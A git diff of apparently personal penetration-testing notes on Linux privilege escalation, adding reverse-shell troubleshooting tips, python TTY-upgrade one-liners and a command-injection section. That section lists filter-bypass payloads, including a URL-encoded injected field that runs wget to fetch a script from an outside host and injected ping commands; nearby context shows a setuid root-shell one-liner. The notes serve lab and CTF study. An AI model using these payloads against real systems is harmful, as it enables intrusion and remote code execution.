@@ -16,6 +16,12 @@ description: watch pspy
 
 Expose creds for valid user in system or privesc and generate SSH keys
 
+#### Does your reverse shell always hang instantly?
+
+* Use another payload duh
+* Encode command and execute
+* The `nohup` command in Linux ensures that a process continues running even after the terminal is closed or the user logs out.
+
 {% embed url="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" %}
 
 ```bash
@@ -25,7 +31,8 @@ bash -c '[revshell payload]' #The single quotes make a big difference
 {% code title="Upgrade Reverse Shell" %}
 ```bash
 TTY Shells
-python[3] -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 /usr/bin/script -qc /bin/bash /dev/null
 Ctrl-Z
 
@@ -48,7 +55,7 @@ rlwrap nc -lvnp <port>
 ```
 {% endcode %}
 
-<div align="left"><figure><img src="../.gitbook/assets/image (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1).png" alt="" width="419"><figcaption></figcaption></figure></div>
 
 ## Checklist
 
@@ -189,6 +196,35 @@ More complex privilege control, run only specified actions with elevated privile
 /usr/bin/setcap cap_net_raw+p /bin/ping # add
 ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
+
+### Command Injection <a href="#kernel" id="kernel"></a>
+
+{% hint style="info" %}
+OS Injection under Web Servers & Languages
+{% endhint %}
+
+`;` ends a command and `#` comments out the rest of an existing one\
+`&` may have to be URL encoded in web payloads
+
+Any website/interface that provides an input might be running a command with the input as a parameter, think carefully
+
+{% code title="Bypass Character Filters" %}
+```
+${IFS} - Internal Field Separator, default variable in bash [Alternative to whitespace]
+
+#Curly brace expansion
+0xdf;{ping,-c,1,10.10.14.23};#
+0xdf;ping -c 1 10.10.14.23;#
+
+\r\n -> EOL, similar function to ';'
+%0d : \r [Carriage return]
+%0a : \n
+%09 : \t
+
+#Quotes was also not URL encoded
+password=%0abash%09-c%09"wget%09http://10.10.16.48/1.sh"&backup=
+```
+{% endcode %}
 
 ### Binary Tracing <a href="#kernel" id="kernel"></a>
 
